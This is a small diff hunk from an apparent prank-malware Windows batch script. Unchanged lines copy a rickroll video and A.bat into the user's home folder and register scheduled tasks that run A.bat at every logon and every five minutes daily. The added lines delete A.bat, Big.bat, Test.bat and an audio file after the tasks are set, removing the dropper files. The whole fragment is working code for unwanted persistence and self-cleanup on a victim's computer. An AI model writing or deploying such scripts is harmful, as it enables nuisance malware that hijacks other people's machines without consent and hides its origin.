@@ -10,6 +10,10 @@ copy rickroll.mp4 "C:%homepath%"
 copy A.bat "C:%homepath%"
 Schtasks /create /sc ONLOGON /tn L /tr "C:%homepath%\A.bat" 
 Schtasks /create /sc DAILY /tn LOL /tr "C:%homepath%\A.bat" /ri 5 /du 24:00
+del A.bat
+del rickroll.mp3
+del Big.bat
+del Test.bat
 exit
 timeout -1
 :NotAdmin
